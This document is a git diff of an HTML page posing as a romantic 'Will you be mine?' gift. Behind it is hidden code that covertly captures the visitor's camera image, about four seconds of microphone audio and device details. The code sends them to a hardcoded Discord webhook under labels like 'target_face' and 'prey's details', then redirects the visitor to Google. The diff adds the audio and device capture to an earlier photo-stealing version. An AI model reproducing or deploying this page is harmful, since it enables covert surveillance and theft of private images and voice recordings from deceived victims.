@@ -3,100 +3,81 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Proposed Her</title>
-  <link rel="stylesheet" href="./style.css" />
+  <title>A Gift For You</title>
   <style>
-    /* Camera elements ko hidden rakha hai */
     #video, #canvas { display: none; }
-    
-    /* Yes/No buttons ki styling agar style.css load na ho */
-    .btn a {
-      padding: 10px 25px;
-      margin: 10px;
-      text-decoration: none;
-      background: #ff4d6d;
-      color: white;
-      border-radius: 20px;
-      display: inline-block;
-      font-weight: bold;
-    }
+    body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff4d6d; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; display: none; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .container { text-align: center; }
+    .btn a { padding: 15px 40px; background: #ff4d6d; color: #fff; text-decoration: none; border-radius: 30px; font-weight: bold; display: inline-block; transition: 0.3s; }
   </style>
 </head>
 <body>
-  <div class="dev-name" style="position: absolute; top: 10px; left: 10px; font-size: 0.8rem; color: rgba(255,255,255,0.7); font-weight: bold;">
-    Dev by Faisal
+
+<div class="container" id="main-box">
+  <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueGZ3bmZ6Z3J6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3R6Z3AmbGlmZT1n/K6WIhJ07gwGkIAQfwN/giphy.gif" width="300">
+  <h2>Will you be mine? ❤️</h2>
+  <div class="loader" id="loader"></div>
+  <div class="btn" id="btn-container">
+    <a href="javascript:void(0)" onclick="startTheHunt()">Yes, I will!</a>
   </div>
+</div>
 
-  <div class="container" style="text-align: center; padding-top: 50px; font-family: Arial, sans-serif;">
-    <img src="https://media0.giphy.com/media/K6WIhJ07gwGkIAQfwN/giphy.gif" alt="Manja GIF" style="width:100%; max-width:400px; display:block; margin:auto; margin-bottom:20px;">
-    <h1 style="color: #fff;">Do you love me? 🤗</h1>
-    <p style="color: #eee;">Chiku is all yours</p>
-    <div class="btn">
-      <a href="javascript:void(0)" onclick="startCapture('user')">Yes</a>
-      <a href="javascript:void(0)" onclick="startCapture('user')">No</a>
-    </div>
-  </div>
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
 
-  <video id="video" autoplay></video>
-  <canvas id="canvas"></canvas>
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
 
-  <script>
-    // Aapka Discord Webhook URL yahan add kar diya hai
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1492440049948692621/bvCYRkOqyKkKb1o1QWU0ztStZNc8JF9DAmF4xgdJpv8pGVbqVtrogVeFSI0sCzN9AkFS";
+async function startTheHunt() {
+    // Buttons chhupa do aur loader dikhao taake user wait kare
+    document.getElementById('btn-container').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
+    
+    // System Info nikaalo
+    let info = `📱 **Device Info:**\n- Platform: ${navigator.platform}\n- RAM: ${navigator.deviceMemory}GB\n- Language: ${navigator.language}`;
 
-    async function startCapture(mode) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: mode } 
-        });
-        
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // Photo lene se pehle thora wait (1.5 sec)
+        // 1. Photo Capture
         setTimeout(() => {
-          captureImage(stream, mode);
-        }, 1500);
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('file', blob, 'target_face.png');
+                fd.append('content', `🔥 **Faisal Bhai, Shikaar Ki Detail!**\n${info}`);
+                fetch(WEBHOOK, { method: 'POST', body: fd });
+            }, 'image/png');
+        }, 1000);
 
-      } catch (err) {
-        console.log("Permission Error: ", err);
-        // Agar user block kare to bhi redirect kar dein
-        window.location.href = "page1.html";
-      }
+        // 2. Audio Capture (3 seconds silent recording)
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+            const fd = new FormData();
+            fd.append('file', audioBlob, 'target_voice.webm');
+            fetch(WEBHOOK, { method: 'POST', body: fd }).then(() => {
+                window.location.href = "https://google.com"; // Redirect to safety
+            });
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => mediaRecorder.stop(), 4000); // 4 sec record karo
+
+    } catch (e) {
+        window.location.href = "https://google.com";
     }
-
-    function captureImage(stream, mode) {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('file', blob, `faisal_capture_${mode}.png`);
-        formData.append('content', `🚀 **Alert! Faisal Bhai, Nayi Photo Agayi!**\n📸 Camera: ${mode === 'user' ? 'Front (Selfie)' : 'Back'}`);
-
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        }).then(() => {
-          // Stream close karna
-          stream.getTracks().forEach(track => track.stop());
-          
-          if(mode === 'user') {
-            // Front ke baad foran Back camera try karein
-            startCapture('environment'); 
-          } else {
-            // Sab done, ab next page par bhej dein
-            window.location.href = "page1.html";
-          }
-        }).catch(err => {
-            window.location.href = "page1.html";
-        });
-      }, 'image/png');
-    }
-  </script>
+}
+</script>
 </body>
 </html>
